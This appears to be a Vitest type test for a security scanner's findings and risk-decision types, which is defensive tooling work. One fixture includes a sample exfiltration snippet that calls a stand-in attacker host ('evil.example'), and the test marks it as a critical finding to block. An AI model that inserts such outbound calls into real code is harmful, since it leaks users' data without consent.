import { describe, expect, expectTypeOf, it } from "vitest";
import type {
  Finding,
  FindingCategory,
  OutputFormat,
  RiskAssessment,
  ScanOptions
} from "../src/index.js";

describe("core types", () => {
  it("supports blocking security findings", () => {
    const finding: Finding = {
      id: "finding-1",
      riskLevel: "Critical",
      category: "data-exfiltration",
      filePath: "src/index.ts",
      lineStart: 1,
      lineEnd: 5,
      codeSnippet: "https.request('https://evil.example')",
      explanation: "Sensitive data is sent to an external destination.",
      recommendedFix: "Remove the outbound request or require explicit user consent.",
      evidenceTags: ["network", "secret-source"],
      confidence: "High"
    };

    expect(finding.riskLevel).toBe("Critical");
  });

  it("supports decision output", () => {
    const risk: RiskAssessment = {
      overallRiskLevel: "Critical",
      decision: "Block",
      rationale: "A critical exfiltration finding is present.",
      topRisks: ["Sensitive data leaves the machine."],
      severityCounts: { Critical: 1, High: 0, Medium: 0, Low: 0, Info: 0 },
      categoryCounts: { "data-exfiltration": 1 },
      blockingFindingIds: ["finding-1"],
      residualRisk: "Do not run until the exfiltration path is removed.",
      scanLimitations: ["Static analysis only."]
    };

    expect(risk.decision).toBe("Block");
  });

  it("exports canonical category and output format vocabularies", () => {
    const category = "data-exfiltration" satisfies FindingCategory;
    const outputFormat = "sarif" satisfies OutputFormat;
    // @ts-expect-error invalid finding categories must be rejected
    const invalidCategory: FindingCategory = "crypto-mining";
    void invalidCategory;

    expectTypeOf<Finding["category"]>().toEqualTypeOf<FindingCategory>();
    expectTypeOf<ScanOptions["outputFormats"]>().toEqualTypeOf<OutputFormat[]>();
    expectTypeOf<RiskAssessment["categoryCounts"]>().toEqualTypeOf<
      Partial<Record<FindingCategory, number>>
    >();

    expect(category).toBe("data-exfiltration");
    expect(outputFormat).toBe("sarif");
  });
});
